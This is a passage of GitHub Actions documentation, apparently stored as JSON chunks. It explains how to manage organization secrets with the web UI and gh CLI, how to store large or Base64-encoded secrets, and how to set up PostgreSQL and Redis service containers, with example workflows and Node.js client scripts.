reusables.actions.actions-secrets-tab %}\n\n   !Screenshot of the \"Actions secrets and variables\" page. A tab, labeled \"Secrets,\" is outlined in dark orange.{% endif %}\n1. Click **New organization secret**.\n1. Type a name for your secret in the **Name** input box.\n1. Enter the **Value** for your secret.\n1. From the **Repository access** dropdown list, choose an access policy.\n1. Click **Add secret**.\n\n{% endwebui %}\n\n{% cli %}\n\n{% note %}\n\n**Note:** By default, {% data variables.product.prodname_cli %} authenticates with the `repo` and `read:org` scopes. To manage organization secrets, you must additionally authorize the `admin:org` scope.\n\n```shell\ngh auth login --scopes \"admin:org\"\n```\n\n{% endnote %}\n\nTo add a secret for an organization, use the `gh secret set` subcommand with the `--org` or `-o` flag followed by the organization name.\n\n```shell\ngh secret set --org ORG_NAME SECRET_NAME\n```\n\nBy default, the secret is only available to private repositories. To specify that the secret should be available to all repositories within the organization, use the `--visibility` or `-v` flag.\n\n```shell\ngh secret set --org ORG_NAME SECRET_NAME --visibility all\n```\n\nTo specify that the secret should be available to selected repositories within the organization, use the `--repos` or `-r` flag.\n\n```shell\ngh secret set --org ORG_NAME SECRET_NAME --repos REPO-NAME-1, REPO-NAME-2\"\n```\n\nTo list all secrets for an organization, use the `gh secret list` subcommand with the `--org` or `-o` flag followed by the organization name.\n\n```shell\ngh secret list --org ORG_NAME\n```\n\n{% endcli %}\n\n\n\nReviewing access to organization-level secrets\n\nYou can check which access policies are being applied to a secret in your organization.\n\n{% data reusables.organizations.navigate-to-org %}\n{% data reusables.organizations.org_settings %}\n{% data reusables.actions.", "Y2h1bmtfNF9pbmRleF8xODQ=": "sidebar-secrets-and-variables %}\n1. The list of secrets includes any configured permissions and policies. For more details about the configured permissions for each secret, click **Update**.\n\n\n\nUsing secrets in a workflow\n\n{% note %}\n\n**Notes:**\n\n- {% data reusables.actions.forked-secrets %}\n\n- Secrets are not automatically passed to reusable workflows. For more information, see \"AUTOTITLE.\"\n\n{% endnote %}\n\nTo provide an action with a secret as an input or environment variable, you can use the `secrets` context to access secrets you've created in your repository. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n{% raw %}\n\n```yaml\nsteps:\n  - name: Hello world action\n    with: # Set the secret as an input\n      super_secret: ${{ secrets.SuperSecret }}\n    env: # Or as an environment variable\n      super_secret: ${{ secrets.SuperSecret }}\n```\n\n{% endraw %}\n\nSecrets cannot be directly referenced in `if:` conditionals. Instead, consider setting secrets as job-level environment variables, then referencing the environment variables to conditionally run steps in the job. For more information, see \"AUTOTITLE\" and `jobs..steps[*].if`.\n\nIf a secret has not been set, the return value of an expression referencing the secret (such as {% raw %}`${{ secrets.SuperSecret }}`{% endraw %} in the example) will be an empty string.\n\nAvoid passing secrets between processes from the command line, whenever possible. Command-line processes may be visible to other users (using the `ps` command) or captured by security audit events. To help protect secrets, consider using environment variables, `STDIN`, or other mechanisms supported by the target process.\n\nIf you must pass secrets within a command line, then enclose them within the proper quoting rules. Secrets often contain special characters that may unintentionally affect your shell. To escape these special characters, use quoting with your environment variables. For example:\n\n\n\nExample using Bash\n\n{% raw %}\n\n```yaml\nsteps:\n  - shell: bash\n    env:\n      SUPER_SECRET: ${{ secrets.S", "Y2h1bmtfNV9pbmRleF8xODQ=": "uperSecret }}\n    run: |\n      example-command \"$SUPER_SECRET\"\n```\n\n{% endraw %}\n\n\n\nExample using PowerShell\n\n{% raw %}\n\n```yaml\nsteps:\n  - shell: pwsh\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"$env:SUPER_SECRET\"\n```\n\n{% endraw %}\n\n\n\nExample using Cmd.exe\n\n{% raw %}\n\n```yaml\nsteps:\n  - shell: cmd\n    env:\n      SUPER_SECRET: ${{ secrets.SuperSecret }}\n    run: |\n      example-command \"%SUPER_SECRET%\"\n```\n\n{% endraw %}\n\n\n\nLimits for secrets\n\nYou can store up to 1,000 organization secrets, 100 repository secrets, and 100 environment secrets.\n\nA workflow created in a repository can access the following number of secrets:\n\n- All 100 repository secrets.\n- If the repository is assigned access to more than 100 organization secrets, the workflow can only use the first 100 organization secrets (sorted alphabetically by secret name).\n- All 100 environment secrets.\n\nSecrets are limited to 48 KB in size. To store larger secrets, see the \"Storing large secrets\" workaround below.\n\n\n\nStoring large secrets\n\nTo use secrets that are larger than 48 KB, you can use a workaround to store secrets in your repository and save the decryption passphrase as a secret on {% data variables.product.prodname_dotcom %}. For example, you can use `gpg` to encrypt a file containing your secret locally before checking the encrypted file in to your repository on {% data variables.product.prodname_dotcom %}. For more information, see the \"gpg manpage.\"\n\n{% warning %}\n\n**Warning**: Be careful that your secrets do not get printed when your workflow runs. When using this workaround, {% data variables.product.prodname_dotcom %} does not redact secrets that are printed in logs.\n\n{% endwarning %}\n\n1. Run the following command from your terminal to encrypt the file containing your secret using `gpg` and the AES256 cipher algorithm. In this example, `my_secret.json` is the file containing the secret.\n\n   ```shell\n   gpg --symmetric --cipher-algo AES256 my_secret.json\n   ```\n\n1. You will be prompted to enter a pa", "Y2h1bmtfNl9pbmRleF8xODQ=": "ssphrase. Remember the passphrase, because you'll need to create a new secret on {% data variables.product.prodname_dotcom %} that uses the passphrase as the value.\n\n1. Create a new secret that contains the passphrase. For example, create a new secret with the name `LARGE_SECRET_PASSPHRASE` and set the value of the secret to the passphrase you used in the step above.\n\n1. Copy your encrypted file to a path in your repository and commit it. In this example, the encrypted file is `my_secret.json.gpg`.\n\n   {% warning %}\n\n   **Warning**: Make sure to copy the encrypted `my_secret.json.gpg` file ending with the `.gpg` file extension, and **not** the unencrypted `my_secret.json` file.\n\n   {% endwarning %}\n\n   ```shell\n   git add my_secret.json.gpg\n   git commit -m \"Add new secret JSON file\"\n   ```\n\n1. Create a shell script in your repository to decrypt the secret file. In this example, the script is named `decrypt_secret.sh`.\n\n   ```shell copy\n   #!/bin/sh\n\n   # Decrypt the file\n   mkdir $HOME/secrets\n   # --batch to prevent interactive command\n   # --yes to assume \"yes\" for questions\n   gpg --quiet --batch --yes --decrypt --passphrase=\"$LARGE_SECRET_PASSPHRASE\" \\\n   --output $HOME/secrets/my_secret.json my_secret.json.gpg\n   ```\n\n1. Ensure your shell script is executable before checking it in to your repository.\n\n   ```shell\n   chmod +x decrypt_secret.sh\n   git add decrypt_secret.sh\n   git commit -m \"Add new decryption script\"\n   git push\n   ```\n\n1. In your {% data variables.product.prodname_actions %} workflow, use a `step` to call the shell script and decrypt the secret. To have a copy of your repository in the environment that your workflow runs in, you'll need to use the `actions/checkout` action. Reference your shell script using the `run` command relative to the root of your repository.\n\n   ```yaml\n   name: Workflows with large secrets\n\n   on: push\n\n   jobs:\n     my-job:\n       name: My Job\n       runs-on: ubuntu-latest\n       steps:\n         - uses: {% data reusables.actions.action-checkout %}\n         - name: D", "Y2h1bmtfN19pbmRleF8xODQ=": "ecrypt large secret\n           run: ./decrypt_secret.sh\n           env:\n             LARGE_SECRET_PASSPHRASE: {% raw %}${{ secrets.LARGE_SECRET_PASSPHRASE }}{% endraw %}\n         # This command is just an example to show your secret being printed\n         # Ensure you remove any print statements of your secrets. GitHub does\n         # not hide secrets that use this workaround.\n         - name: Test printing your secret (Remove this step in production)\n           run: cat $HOME/secrets/my_secret.json\n   ```\n\n\n\nStoring Base64 binary blobs as secrets\n\nYou can use Base64 encoding to store small binary blobs as secrets. You can then reference the secret in your workflow and decode it for use on the runner. For the size limits, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note**: Note that Base64 only converts binary to text, and is not a substitute for actual encryption.\n\n{% endnote %}\n\n1. Use `base64` to encode your file into a Base64 string. For example:\n\n   On MacOS, you could run:\n\n   ```shell\n   base64 -i cert.der -o cert.base64\n   ```\n\n   On Linux, you could run:\n\n   ```shell\n   base64 -w 0 cert.der > cert.base64\n   ```\n\n1. Create a secret that contains the Base64 string. For example:\n\n   ```shell\n   $ gh secret set CERTIFICATE_BASE64 < cert.base64\n   \u2713 Set secret CERTIFICATE_BASE64 for octocat/octorepo\n   ```\n\n1. To access the Base64 string from your runner, pipe the secret to `base64 --decode`.  For example:\n\n   ```yaml\n   name: Retrieve Base64 secret\n   on:\n     push:\n       branches: [ octo-branch ]\n   jobs:\n     decode-secret:\n       runs-on: ubuntu-latest\n       steps:\n         - uses: {% data reusables.actions.action-checkout %}\n         - name: Retrieve the secret and decode it to a file\n           env:\n             {% raw %}CERTIFICATE_BASE64: ${{ secrets.CERTIFICATE_BASE64 }}{% endraw %}\n           run: |\n             echo $CERTIFICATE_BASE64 | base64 --decode > cert.der\n         - name: Show certificate information\n           run: |\n             openssl x509 -in cert.der -inform DER -text -noout\n   ```\n\n{% note %}", "Y2h1bmtfOF9pbmRleF8xODQ=": "\n\n**Note**: Using another shell might require different commands for decoding the secret to a file. On Windows runners, we recommend using a bash shell with `shell: bash` to use the commands in the `run` step above.\n\n{% endnote %}\n\n\n\nRedacting secrets from workflow run logs\n\nWhile {% data variables.product.prodname_dotcom %} automatically redacts secrets printed to workflow logs, runners can only delete secrets they have access to. This means a secret will only be redacted if it was used within a job. As a security measure, you can delete workflow run logs to prevent sensitive values being leaked. For more information, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xODU=": "\n\nAbout service containers\n\nService containers are Docker containers that provide a simple and portable way for you to host services that you might need to test or operate your application in a workflow. For example, your workflow might need to run integration tests that require access to a database and memory cache.\n\nYou can configure service containers for each job in a workflow. {% data variables.product.prodname_dotcom %} creates a fresh Docker container for each service configured in the workflow, and destroys the service container when the job completes. Steps in a job can communicate with all service containers that are part of the same job. However, you cannot create and use service containers inside a composite action.\n\n{% data reusables.actions.docker-container-os-support %}\n\n\n\nCommunicating with service containers\n\nYou can configure jobs in a workflow to run directly on a runner machine or in a Docker container. Communication between a job and its service containers is different depending on whether a job runs directly on the runner machine or in a container.\n\n\n\nRunning jobs in a container\n\nWhen you run jobs in a container, {% data variables.product.prodname_dotcom %} connects service containers to the job using Docker's user-defined bridge networks. For more information, see \"Use bridge networks\" in the Docker documentation.\n\nRunning the job and services in a container simplifies network access. You can access a service container using the label you configure in the workflow. The hostname of the service container is automatically mapped to the label name. For example, if you create a service container with the label `redis`, the hostname of the service container is `redis`.\n\nYou don't need to configure any ports for service containers. By default, all containers that are part of the same Docker network expose all ports to each other, and no ports are exposed outside of the Docker network.\n\n\n\nRunning jobs on the runner machine\n\nWhen running jobs directly on the runner machine, you can access service co", "Y2h1bmtfMV9pbmRleF8xODU=": "ntainers using `localhost:` or `127.0.0.1:`. {% data variables.product.prodname_dotcom %} configures the container network to enable communication from the service container to the Docker host.\n\nWhen a job runs directly on a runner machine, the service running in the Docker container does not expose its ports to the job on the runner by default. You need to map ports on the service container to the Docker host. For more information, see \"AUTOTITLE.\"\n\n\n\nCreating service containers\n\nYou can use the `services` keyword to create service containers that are part of a job in your workflow. For more information, see `jobs..services`.\n\nThis example creates a service called `redis` in a job called `container-job`. The Docker host in this example is the `node:16-bullseye` container.\n\n{% raw %}\n\n```yaml copy\nname: Redis container example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:16-bullseye\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n```\n\n{% endraw %}\n\n\n\nMapping Docker host and service container ports\n\nIf your job runs in a Docker container, you do not need to map ports on the host or the service container. If your job runs directly on the runner machine, you'll need to map any required service container ports to ports on the host runner machine.\n\nYou can map service containers ports to the Docker host using the `ports` keyword. For more information, see `jobs..services`.\n\n| Value of `ports` |\tDescription |\n|------------------|--------------|\n| `8080:80` |\tMaps TCP port 80 in the container to port 8080 on the Docker host. |\n| `8080:80/udp` |\tMaps UDP port 80 in the container to port 8080 on the Docker host. |\n| `8080/udp`\t| Map a randomly chosen UDP port in the container to UDP port 8080 on the Docker host. |\n", "Y2h1bmtfMl9pbmRleF8xODU=": "\nWhen you map ports using the `ports` keyword, {% data variables.product.prodname_dotcom %} uses the `--publish` command to publish the container\u2019s ports to the Docker host. For more information, see \"Docker container networking\" in the Docker documentation.\n\nWhen you specify the Docker host port but not the container port, the container port is randomly assigned to a free port. {% data variables.product.prodname_dotcom %} sets the assigned container port in the service container context. For example, for a `redis` service container, if you configured the Docker host port 5432, you can access the corresponding container port using the `job.services.redis.ports5432]` context. For more information, see \"[AUTOTITLE.\"\n\n\n\nExample mapping Redis ports\n\nThis example maps the service container `redis` port 6379 to the Docker host port 6379.\n\n{% raw %}\n\n```yaml copy\nname: Redis Service Example\non: push\n\njobs:\n  # Label of the container job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        #\n        ports:\n          # Opens tcp port 6379 on the host and service container\n          - 6379:6379\n```\n\n{% endraw %}\n\n\n\nFurther reading\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n", "Y2h1bmtfMF9pbmRleF8xODY=": "\n\nIntroduction\n\nThis guide shows you workflow examples that configure a service container using the Docker Hub `postgres` image. The workflow runs a script that connects to the PostgreSQL service, creates a table, and then populates it with data. To test that the workflow creates and populates the PostgreSQL table, the script prints the data from the table to the console.\n\n{% data reusables.actions.docker-container-os-support %}\n\n\n\nPrerequisites\n\n{% data reusables.actions.service-container-prereqs %}\n\nYou may also find it helpful to have a basic understanding of YAML, the syntax for {% data variables.product.prodname_actions %}, and PostgreSQL. For more information, see:\n\n- \"AUTOTITLE\"\n- \"PostgreSQL tutorial\" in the PostgreSQL documentation\n\n\n\nRunning jobs in containers\n\n{% data reusables.actions.container-jobs-intro %}\n\n{% data reusables.actions.copy-workflow-file %}\n\n```yaml copy\nname: PostgreSQL service example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:10.18-jessie\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run", "Y2h1bmtfMV9pbmRleF8xODY=": ": npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL table, populates\n        # the table with data, and then retrieves the data.\n        run: node client.js\n        # Environment variables used by the `client.js` script to create a new PostgreSQL table.\n        env:\n          # The hostname used to communicate with the PostgreSQL service container\n          POSTGRES_HOST: postgres\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432\n```\n\n\n\nConfiguring the runner job for jobs in containers\n\n{% data reusables.actions.service-container-host %}\n\n{% data reusables.actions.postgres-label-description %}\n\n```yaml copy\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:10.18-jessie\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n```\n\n\n\nConfiguring the steps for jobs in containers\n\n{% data reusables.actions.service-template-steps %}\n\n```yaml copy\nsteps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: {% data reusables.actions.action-checkout %}\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to PostgreSQL\n    # Runs a script that creates a PostgreSQL table, populates\n    # the table with data, and then retrieves the data.\n    run: nod", "Y2h1bmtfMl9pbmRleF8xODY=": "e client.js\n    # Environment variable used by the `client.js` script to create\n    # a new PostgreSQL client.\n    env:\n      # The hostname used to communicate with the PostgreSQL service container\n      POSTGRES_HOST: postgres\n      # The default PostgreSQL port\n      POSTGRES_PORT: 5432\n```\n\n{% data reusables.actions.postgres-environment-variables %}\n\nThe hostname of the PostgreSQL service is the label you configured in your workflow, in this case, `postgres`. Because Docker containers on the same user-defined bridge network open all ports by default, you'll be able to access the service container on the default PostgreSQL port 5432.\n\n\n\nRunning jobs directly on the runner machine\n\nWhen you run a job directly on the runner machine, you'll need to map the ports on the service container to ports on the Docker host. You can access service containers from the Docker host using `localhost` and the Docker host port number.\n\n{% data reusables.actions.copy-workflow-file %}\n\n```yaml copy\nname: PostgreSQL Service Example\non: push\n\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps tcp port 5432 on service container to the host\n          - 5432:5432\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies in the `pa", "Y2h1bmtfM19pbmRleF8xODY=": "ckage.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to PostgreSQL\n        # Runs a script that creates a PostgreSQL table, populates\n        # the table with data, and then retrieves the data\n        run: node client.js\n        # Environment variables used by the `client.js` script to create\n        # a new PostgreSQL table.\n        env:\n          # The hostname used to communicate with the PostgreSQL service container\n          POSTGRES_HOST: localhost\n          # The default PostgreSQL port\n          POSTGRES_PORT: 5432\n```\n\n\n\nConfiguring the runner job for jobs directly on the runner machine\n\n{% data reusables.actions.service-container-host-runner %}\n\n{% data reusables.actions.postgres-label-description %}\n\nThe workflow maps port 5432 on the PostgreSQL service container to the Docker host. For more information about the `ports` keyword, see \"AUTOTITLE.\"\n\n```yaml copy\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      postgres:\n        # Docker Hub image\n        image: postgres\n        # Provide the password for postgres\n        env:\n          POSTGRES_PASSWORD: postgres\n        # Set health checks to wait until postgres has started\n        options: >-\n          --health-cmd pg_isready\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps tcp port 5432 on service container to the host\n          - 5432:5432\n```\n\n\n\nConfiguring the steps for jobs directly on the runner machine\n\n{% data reusables.actions.service-template-steps %}\n\n```yaml copy\nsteps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: {% data reusables.actions.action-checko", "Y2h1bmtfNF9pbmRleF8xODY=": "ut %}\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to PostgreSQL\n    # Runs a script that creates a PostgreSQL table, populates\n    # the table with data, and then retrieves the data\n    run: node client.js\n    # Environment variables used by the `client.js` script to create\n    # a new PostgreSQL table.\n    env:\n      # The hostname used to communicate with the PostgreSQL service container\n      POSTGRES_HOST: localhost\n      # The default PostgreSQL port\n      POSTGRES_PORT: 5432\n```\n\n{% data reusables.actions.postgres-environment-variables %}\n\n{% data reusables.actions.service-container-localhost %}\n\n\n\nTesting the PostgreSQL service container\n\nYou can test your workflow using the following script, which connects to the PostgreSQL service and adds a new table with some placeholder data. The script then prints the values stored in the PostgreSQL table to the terminal. Your script can use any language you'd like, but this example uses Node.js and the `pg` npm module. For more information, see the npm pg module.\n\nYou can modify _client.js_ to include any PostgreSQL operations needed by your workflow. In this example, the script connects to the PostgreSQL service, adds a table to the `postgres` database, inserts some placeholder data, and then retrieves the data.\n\n{% data reusables.actions.service-container-add-script %}\n\n```javascript copy\nconst { Client } = require('pg');\n\nconst pgclient = new Client({\n    host: process.env.POSTGRES_HOST,\n    port: process.env.POSTGRES_PORT,\n    user: 'postgres',\n    password: 'postgres',\n    database: 'postgres'\n});\n\npgclient.connect();\n\nconst table = 'CREATE TABLE student(id SERIAL PRIMARY KEY, firstName VARCHAR(40) NOT NULL, lastName VARCHAR(40) NOT NULL, age INT, address VARCHAR(80), email VARCHAR(40))'\nconst text = 'INSERT INTO student(firstname, lastname, age, address, email) VALUES($1, $2, $3, $4, $5) RETURN", "Y2h1bmtfNV9pbmRleF8xODY=": "ING *'\nconst values = ['Mona the', 'Octocat', 9, '88 Colin P Kelly Jr St, San Francisco, CA 94107, United States', 'octocat@github.com']\n\npgclient.query(table, (err, res) => {\n    if (err) throw err\n});\n\npgclient.query(text, values, (err, res) => {\n    if (err) throw err\n});\n\npgclient.query('SELECT * FROM student', (err, res) => {\n    if (err) throw err\n    console.log(err, res.rows) // Print the data in student table\n    pgclient.end()\n});\n```\n\nThe script creates a new connection to the PostgreSQL service, and uses the `POSTGRES_HOST` and `POSTGRES_PORT` environment variables to specify the PostgreSQL service IP address and port. If `host` and `port` are not defined, the default host is `localhost` and the default port is 5432.\n\nThe script creates a table and populates it with placeholder data. To test that the `postgres` database contains the data, the script prints the contents of the table to the console log.\n\nWhen you run this workflow, you should see the following output in the \"Connect to PostgreSQL\" step, which confirms that you successfully created the PostgreSQL table and added data:\n\n```text\nnull [ { id: 1,\n    firstname: 'Mona the',\n    lastname: 'Octocat',\n    age: 9,\n    address:\n     '88 Colin P Kelly Jr St, San Francisco, CA 94107, United States',\n    email: 'octocat@github.com' } ]\n```\n\n", "Y2h1bmtfMF9pbmRleF8xODc=": "\n\nIntroduction\n\nThis guide shows you workflow examples that configure a service container using the Docker Hub `redis` image. The workflow runs a script to create a Redis client and populate the client with data. To test that the workflow creates and populates the Redis client, the script prints the client's data to the console.\n\n{% data reusables.actions.docker-container-os-support %}\n\n\n\nPrerequisites\n\n{% data reusables.actions.service-container-prereqs %}\n\nYou may also find it helpful to have a basic understanding of YAML, the syntax for {% data variables.product.prodname_actions %}, and Redis. For more information, see:\n\n- \"AUTOTITLE\"\n- \"Getting Started with Redis\" in the Redis documentation\n\n\n\nRunning jobs in containers\n\n{% data reusables.actions.container-jobs-intro %}\n\n{% data reusables.actions.copy-workflow-file %}\n\n```yaml copy\nname: Redis container example\non: push\n\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:10.18-jessie\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to Redis\n        # Runs a script that creates a Redis client, populates\n        # the client with data, and retrieve", "Y2h1bmtfMV9pbmRleF8xODc=": "s data\n        run: node client.js\n        # Environment variable used by the `client.js` script to create a new Redis client.\n        env:\n          # The hostname used to communicate with the Redis service container\n          REDIS_HOST: redis\n          # The default Redis port\n          REDIS_PORT: 6379\n```\n\n\n\nConfiguring the container job\n\n{% data reusables.actions.service-container-host %}\n\n{% data reusables.actions.redis-label-description %}\n\n```yaml copy\njobs:\n  # Label of the container job\n  container-job:\n    # Containers must run in Linux based operating systems\n    runs-on: ubuntu-latest\n    # Docker Hub image that `container-job` executes in\n    container: node:10.18-jessie\n\n    # Service containers to run with `container-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n```\n\n\n\nConfiguring the steps for the container job\n\n{% data reusables.actions.service-template-steps %}\n\n```yaml copy\nsteps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: {% data reusables.actions.action-checkout %}\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to Redis\n    # Runs a script that creates a Redis client, populates\n    # the client with data, and retrieves data\n    run: node client.js\n    # Environment variable used by the `client.js` script to create a new Redis client.\n    env:\n      # The hostname used to communicate with the Redis service container\n      REDIS_HOST: redis\n      # The default Redis port\n      REDIS_PORT: 6379\n```\n\n{% data reusables.actions.redis-environment-variables %}\n\nThe ho", "Y2h1bmtfMl9pbmRleF8xODc=": "stname of the Redis service is the label you configured in your workflow, in this case, `redis`. Because Docker containers on the same user-defined bridge network open all ports by default, you'll be able to access the service container on the default Redis port 6379.\n\n\n\nRunning jobs directly on the runner machine\n\nWhen you run a job directly on the runner machine, you'll need to map the ports on the service container to ports on the Docker host. You can access service containers from the Docker host using `localhost` and the Docker host port number.\n\n{% data reusables.actions.copy-workflow-file %}\n\n```yaml copy\nname: Redis runner example\non: push\n\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps port 6379 on service container to the host\n          - 6379:6379\n\n    steps:\n      # Downloads a copy of the code in your repository before running CI tests\n      - name: Check out repository code\n        uses: {% data reusables.actions.action-checkout %}\n\n      # Performs a clean installation of all dependencies in the `package.json` file\n      # For more information, see https://docs.npmjs.com/cli/ci.html\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Connect to Redis\n        # Runs a script that creates a Redis client, populates\n        # the client with data, and retrieves data\n        run: node client.js\n        # Environment variable used by the `client.js` script to create\n        # a new Redis client.\n        env:\n          # The hostname used to communicate with the ", "Y2h1bmtfM19pbmRleF8xODc=": "Redis service container\n          REDIS_HOST: localhost\n          # The default Redis port\n          REDIS_PORT: 6379\n```\n\n\n\nConfiguring the runner job\n\n{% data reusables.actions.service-container-host-runner %}\n\n{% data reusables.actions.redis-label-description %}\n\nThe workflow maps port 6379 on the Redis service container to the Docker host. For more information about the `ports` keyword, see \"AUTOTITLE.\"\n\n```yaml copy\njobs:\n  # Label of the runner job\n  runner-job:\n    # You must use a Linux environment when using service containers or container jobs\n    runs-on: ubuntu-latest\n\n    # Service containers to run with `runner-job`\n    services:\n      # Label used to access the service container\n      redis:\n        # Docker Hub image\n        image: redis\n        # Set health checks to wait until redis has started\n        options: >-\n          --health-cmd \"redis-cli ping\"\n          --health-interval 10s\n          --health-timeout 5s\n          --health-retries 5\n        ports:\n          # Maps port 6379 on service container to the host\n          - 6379:6379\n```\n\n\n\nConfiguring the steps for the runner job\n\n{% data reusables.actions.service-template-steps %}\n\n```yaml copy\nsteps:\n  # Downloads a copy of the code in your repository before running CI tests\n  - name: Check out repository code\n    uses: {% data reusables.actions.action-checkout %}\n\n  # Performs a clean installation of all dependencies in the `package.json` file\n  # For more information, see https://docs.npmjs.com/cli/ci.html\n  - name: Install dependencies\n    run: npm ci\n\n  - name: Connect to Redis\n    # Runs a script that creates a Redis client, populates\n    # the client with data, and retrieves data\n    run: node client.js\n    # Environment variable used by the `client.js` script to create\n    # a new Redis client.\n    env:\n      # The hostname used to communicate with the Redis service container\n      REDIS_HOST: localhost\n      # The default Redis port\n      REDIS_PORT: 6379\n```\n\n{% data reusables.actions.redis-environment-variables %}\n\n{% data reusa", "Y2h1bmtfNF9pbmRleF8xODc=": "bles.actions.service-container-localhost %}\n\n\n\nTesting the Redis service container\n\nYou can test your workflow using the following script, which creates a Redis client and populates the client with some placeholder data. The script then prints the values stored in the Redis client to the terminal. Your script can use any language you'd like, but this example uses Node.js and the `redis` npm module. For more information, see the npm redis module.\n\nYou can modify _client.js_ to include any Redis operations needed by your workflow. In this example, the script creates the Redis client instance, adds placeholder data, then retrieves the data.\n\n{% data reusables.actions.service-container-add-script %}\n\n```javascript copy\nconst redis = require(\"redis\");\n\n// Creates a new Redis client\n// If REDIS_HOST is not set, the default host is localhost\n// If REDIS_PORT is not set, the default port is 6379\nconst redisClient = redis.createClient({\n  url: `redis://${process.env.REDIS_HOST}:${process.env.REDIS_PORT}`\n});\n\nredisClient.on(\"error\", (err) => console.log(\"Error\", err));\n\n(async () => {\n  await redisClient.connect();\n\n  // Sets the key \"octocat\" to a value of \"Mona the octocat\"\n  const setKeyReply = await redisClient.set(\"octocat\", \"Mona the Octocat\");\n  console.log(\"Reply: \" + setKeyReply);\n  // Sets a key to \"species\", field to \"octocat\", and \"value\" to \"Cat and Octopus\"\n  const SetFieldOctocatReply = await redisClient.hSet(\"species\", 